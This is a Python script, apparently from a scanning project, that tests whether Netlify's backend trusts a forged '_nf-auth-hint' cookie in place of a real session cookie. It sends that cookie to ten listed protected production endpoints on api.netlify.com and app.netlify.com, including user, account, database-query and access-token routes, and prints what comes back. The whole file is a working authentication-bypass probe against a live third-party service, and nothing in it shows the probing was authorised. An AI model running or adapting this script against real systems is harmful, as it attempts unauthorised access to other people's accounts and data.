# -*- coding: utf-8 -*-
"""Netlify:_nf-auth-hint 伪造 cookie 是否被后端信任(无 _nf-auth 真 cookie)"""
import http.client, ssl, gzip, brotli, sys, json
sys.path.insert(0, r'D:\scan\netlify_report')

HINT_ONLY = '_nf-auth-hint=user-is-likely-authed'
ctx = ssl.create_default_context()

def req(host, path, method='GET', body=None, headers=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json'}
    if body is not None:
        h['Content-Type'] = 'application/json'
        body = json.dumps(body).encode()
    if headers:
        h.update(headers)
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

print('=== hint-only cookie 访问受保护端点 ===')
tests = [
    ('api.netlify.com', 'GET', '/api/v1/user'),
    ('api.netlify.com', 'GET', '/api/v1/sites'),
    ('api.netlify.com', 'GET', '/api/v1/accounts'),
    ('app.netlify.com', 'GET', '/.netlify/functions/labs-list'),
    ('app.netlify.com', 'GET', '/.netlify/functions/generate-bandwidth-usage-csv'),
    ('app.netlify.com', 'GET', '/access-control/generate-access-control-token'),
    ('app.netlify.com', 'POST', '/.netlify/functions/database-query'),
    ('app.netlify.com', 'GET', '/.netlify/functions/fetch-extensions'),
    ('app.netlify.com', 'GET', '/spark-proxy/api/prompt-templates'),
    ('app.netlify.com', 'GET', '/access-control/bb-api/api/v1/user'),
]
for host, m, p in tests:
    body = {'siteId': '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4', 'action': 'check'} if p.endswith('database-query') else None
    try:
        s, raw = req(host, p, method=m, body=body, headers={'Cookie': HINT_ONLY})
        print('%-22s %-4s %-50s %d %s' % (host, m, p[:50], s,
              raw[:80].decode('utf-8', 'ignore').replace('\n', ' ')))
    except Exception as e:
        print('%-22s %-4s %-50s ERR %s' % (host, m, p[:50], str(e)[:40]))
